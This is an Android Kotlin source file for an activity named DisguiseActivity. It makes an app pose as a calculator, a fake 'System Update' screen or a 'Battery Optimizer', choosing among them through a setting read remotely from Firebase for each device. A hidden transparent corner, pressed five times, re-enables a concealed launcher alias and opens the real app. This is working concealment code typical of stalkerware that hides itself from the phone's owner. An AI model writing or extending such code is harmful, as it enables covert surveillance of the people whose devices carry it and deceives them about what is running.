package com.example.myapplicationtestweb

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class DisguiseActivity : Activity() {
    private var clickCount = 0
    private var lastClickTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val userId = Config.getUserId(this)
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val dbUrl = Config.getDbUrl(this)
        
        if (userId.isEmpty() || deviceId == null) {
            setupUI("calculator")
            return
        }

        val db = FirebaseDatabase.getInstance(dbUrl)
        val ref = db.reference.child("users").child(userId).child("devices").child(deviceId).child("settings/disguise_theme")

        ref.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val theme = snapshot.getValue(String::class.java) ?: "calculator"
                setupUI(theme)
            }
            override fun onCancelled(error: DatabaseError) {
                setupUI("calculator")
            }
        })
    }

    private fun setupUI(theme: String) {
        val rootLayout = LinearLayout(this)
        rootLayout.orientation = LinearLayout.VERTICAL
        rootLayout.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        rootLayout.gravity = Gravity.CENTER
        rootLayout.setBackgroundColor(Color.WHITE)

        when (theme) {
            "calculator" -> {
                title = "Calculator"
                val tv = TextView(this)
                tv.text = "0"
                tv.textSize = 48f
                tv.gravity = Gravity.END
                tv.setPadding(32, 32, 32, 32)
                rootLayout.addView(tv)
                val btnLayout = LinearLayout(this)
                btnLayout.orientation = LinearLayout.VERTICAL
                btnLayout.layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                rootLayout.addView(btnLayout)
            }
            "system_update" -> {
                title = "System Update"
                rootLayout.setBackgroundColor(Color.BLACK)
                val pb = ProgressBar(this)
                rootLayout.addView(pb)
                val tv = TextView(this)
                tv.text = "Installing system update...\nPlease do not turn off your device."
                tv.setTextColor(Color.WHITE)
                tv.gravity = Gravity.CENTER
                tv.setPadding(0, 32, 0, 0)
                rootLayout.addView(tv)
            }
            "battery_saver" -> {
                title = "Battery Optimizer"
                rootLayout.setBackgroundColor(Color.parseColor("#121212"))
                val tv = TextView(this)
                tv.text = "Optimizing battery life..."
                tv.setTextColor(Color.GREEN)
                tv.textSize = 24f
                tv.gravity = Gravity.CENTER
                rootLayout.addView(tv)
            }
            else -> {
                title = "Calculator"
            }
        }

        val hiddenArea = View(this)
        val params = LinearLayout.LayoutParams(150, 150)
        params.gravity = Gravity.BOTTOM or Gravity.END
        hiddenArea.layoutParams = params
        hiddenArea.setBackgroundColor(Color.TRANSPARENT)
        hiddenArea.setOnLongClickListener {
            val now = System.currentTimeMillis()
            if (now - lastClickTime > 2000) {
                clickCount = 0
            }
            lastClickTime = now
            clickCount++
            if (clickCount >= 5) {
                clickCount = 0
                val pm = packageManager
                val componentName = ComponentName(this@DisguiseActivity, "com.example.myapplicationtestweb.LauncherAlias")
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                startActivity(Intent(this@DisguiseActivity, MainActivity::class.java))
                finish()
            }
            true
        }

        val wrapper = LinearLayout(this)
        wrapper.orientation = LinearLayout.VERTICAL
        wrapper.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        
        val contentParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f)
        rootLayout.layoutParams = contentParams
        
        wrapper.addView(rootLayout)
        wrapper.addView(hiddenArea)

        setContentView(wrapper)
    }
}
